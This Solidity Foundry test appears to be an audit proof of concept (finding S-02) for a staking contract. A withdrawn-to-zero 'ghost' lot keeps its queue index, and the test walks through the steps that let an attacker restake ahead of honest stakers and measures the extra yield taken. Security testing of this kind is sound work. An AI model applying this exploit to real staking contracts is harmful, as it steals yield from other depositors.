// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/StakeEngine.sol";
import "./mocks/MockVSP.sol";
import "./mocks/MockProtocolPolicy.sol";

/// S-02: ghost lot retains queue position -> position squatting.
///
/// Withdrawing to zero leaves amount==0 in q.lots with lotIndex still set.
/// _recomputeWeightedPositions skips zero lots, so the ghost consumes no
/// cumulative weight. On restake, _increaseUser hits:
///     if (idx != 0) { q.lots[idx-1].amount += amount; }
/// so the attacker revives AT THEIR OLD INDEX -> lowest wPos -> highest rate.
///
/// Uses REAL deploy rate (script/Deploy.s.sol:86) so the result is not
/// inflated by a governance-cap rate.
contract S02GhostSquattingPoC is Test {
    StakeEngine eng;
    MockVSP vsp;
    MockProtocolPolicy policy;

    uint256 constant POST = 7;
    uint256 constant DEPLOY_RATE_MAX = 693805319167998976; // ~100% APY, as deployed

    address attacker = address(0xA77AC7E2);
    address control = address(0xC0147201);

    function setUp() public {
        vm.warp(86400 * 1000);
        vsp = new MockVSP();
        policy = new MockProtocolPolicy(0);
        policy.setRates(0, DEPLOY_RATE_MAX);
        eng = StakeEngine(
            address(
                new ERC1967Proxy(
                    address(new StakeEngine(address(0))),
                    abi.encodeCall(StakeEngine.initialize, (address(this), address(vsp), address(policy)))
                )
            )
        );
        vsp.mint(address(this), 1e30);
        vsp.approve(address(eng), type(uint256).max);
    }

    function _fund(address who, uint256 amt) internal {
        vsp.mint(who, amt);
        vm.prank(who);
        vsp.approve(address(eng), type(uint256).max);
    }

    function test_S02_GhostRevivesAtFrontOfQueue() public {
        uint256 big = 1000e18;

        // --- Step 1: attacker dust-stakes FIRST on a brand-new post, then exits fully.
        _fund(attacker, 1);
        vm.prank(attacker);
        eng.stake(POST, 0, 1);
        vm.prank(attacker);
        eng.withdraw(POST, 0, 1, true);
        // attacker is now a ghost: amount == 0, lotIndex still 1

        assertEq(eng.getUserStake(attacker, POST, 0), 0, "attacker should be fully exited");

        // --- Step 2: honest stakers arrive and the post grows.
        for (uint256 i = 0; i < 10; i++) {
            address h = address(uint160(0x5000 + i));
            _fund(h, big);
            vm.prank(h);
            eng.stake(POST, 0, big);
        }

        // --- Step 3: attacker restakes large. Control staker stakes the SAME amount
        //     at the SAME time, but has no ghost.
        _fund(attacker, big);
        vm.prank(attacker);
        eng.stake(POST, 0, big);

        _fund(control, big);
        vm.prank(control);
        eng.stake(POST, 0, big);

        // --- Positions: lower weightedPosition == earlier in queue == higher rate.
        (uint256 aAmt, uint256 aPos,, uint256 aWeight) = eng.getUserLotInfo(attacker, POST, 0);
        (uint256 cAmt, uint256 cPos,, uint256 cWeight) = eng.getUserLotInfo(control, POST, 0);

        emit log_named_uint("attacker amount", aAmt);
        emit log_named_uint("control  amount", cAmt);
        emit log_named_uint("attacker weightedPosition", aPos);
        emit log_named_uint("control  weightedPosition", cPos);
        emit log_named_uint("attacker positionWeight (rate multiplier, RAY)", aWeight);
        emit log_named_uint("control  positionWeight (rate multiplier, RAY)", cWeight);

        assertEq(aAmt, cAmt, "same principal, so any yield gap is purely positional");
        assertLt(aPos, cPos, "S-02: ghost revived AHEAD of an equal, honest, later staker");

        // --- Step 4: quantify the stolen yield over one settlement.
        // Support must win so the aligned branch mints.
        address chal = address(0xBEEF);
        _fund(chal, 1);
        vm.prank(chal);
        eng.stake(POST, 1, 1);

        vm.warp(block.timestamp + 30 days);
        eng.updatePost(POST);

        uint256 aAfter = eng.getUserStake(attacker, POST, 0);
        uint256 cAfter = eng.getUserStake(control, POST, 0);
        uint256 aGain = aAfter - big;
        uint256 cGain = cAfter - big;

        emit log_named_uint("attacker gain over 30d", aGain);
        emit log_named_uint("control  gain over 30d", cGain);
        if (cGain > 0) {
            emit log_named_uint("attacker/control gain ratio (bps)", aGain * 10000 / cGain);
        }
        emit log_named_uint("excess captured by attacker", aGain > cGain ? aGain - cGain : 0);

        assertGt(aGain, cGain, "S-02: ghost squatter out-earns an identical honest staker");
    }
}
